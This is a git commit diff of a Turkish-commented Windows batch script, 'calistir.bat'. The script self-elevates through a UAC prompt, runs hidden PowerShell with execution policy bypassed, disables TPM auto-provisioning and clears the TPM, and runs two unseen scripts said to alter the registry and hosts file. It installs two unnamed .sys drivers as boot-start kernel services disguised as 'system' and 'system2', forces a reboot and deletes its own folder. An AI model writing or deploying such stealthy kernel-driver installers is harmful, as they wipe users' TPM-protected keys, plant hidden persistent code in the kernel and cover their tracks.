933ef8b27cc2692133baa5576ae925803b0fd198
ferhatcan3455 <ferobabafer@gmail.com>
2025-06-16 10:32:05 +0300

    Update calistir.bat

--- calistir.bat
+++ calistir.bat
@@ -1,7 +1,7 @@
 @echo off
 setlocal
 
-:: Yönetici izni kontrolü ve komut dosyasının yönetici olarak çalıştırılması
+:: Yönetici izni kontrolü
 openfiles >nul 2>&1 || (
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "cmd.exe", "/c ""%~s0""", "", "runas", 1 >> "%temp%\getadmin.vbs"
@@ -9,25 +9,28 @@ openfiles >nul 2>&1 || (
     exit /B
 )
 
+:: Çalışma dizinini al (örnek: C:\Users\User\AppData\Local\Temp\CHROME_ABC123\)
+set "WORKDIR=%~dp0"
+
 :: TPM ayarları
 powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command Disable-TpmAutoProvisioning'"
 powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command Clear-Tpm'"
 
-:: Reg ve hosts script'lerini çalıştır
-powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-ExecutionPolicy Bypass -File \"C:\Windows\System32\1.ps1\"'"
-powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-ExecutionPolicy Bypass -File \"C:\Windows\System32\2.ps1\"'"
+:: 1.ps1 ve 2.ps1'i doğru konumdan çalıştır
+powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-ExecutionPolicy Bypass -File \"%WORKDIR%1.ps1\"'"
+powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-ExecutionPolicy Bypass -File \"%WORKDIR%2.ps1\"'"
 
-:: Dosyaları System32 klasörüne kopyala
+:: Dosyaları System32'ye kopyala
 set "sys32Dir=C:\Windows\System32"
 
-if exist "%~dp053259239.sys" (
-    copy /y "%~dp053259239.sys" "%sys32Dir%"
+if exist "%WORKDIR%53259239.sys" (
+    copy /y "%WORKDIR%53259239.sys" "%sys32Dir%"
 )
-if exist "%~dp086436432.sys" (
-    copy /y "%~dp086436432.sys" "%sys32Dir%"
+if exist "%WORKDIR%86436432.sys" (
+    copy /y "%WORKDIR%86436432.sys" "%sys32Dir%"
 )
 
-:: Yeni servisleri oluştur (System32 klasöründen çalıştırılacak şekilde)
+:: Servisleri oluştur
 sc create system binPath= "C:\Windows\System32\53259239.sys" DisplayName= "system" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1
 sc create system2 binPath= "C:\Windows\System32\86436432.sys" DisplayName= "system2" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1
 
@@ -35,10 +38,11 @@ sc create system2 binPath= "C:\Windows\System32\86436432.sys" DisplayName= "syst
 sc start system
 sc start system2
 
+:: 2 saniyede yeniden başlat
 shutdown /r /t 2
 
-:: Script dosyasını temizle
-cd /d "%~dp0"
+:: Kendi bulunduğu klasörü temizle
+cd /d "%WORKDIR%"
 del /f /q *.*
 for /d %%i in (*) do rd /s /q "%%i"
 
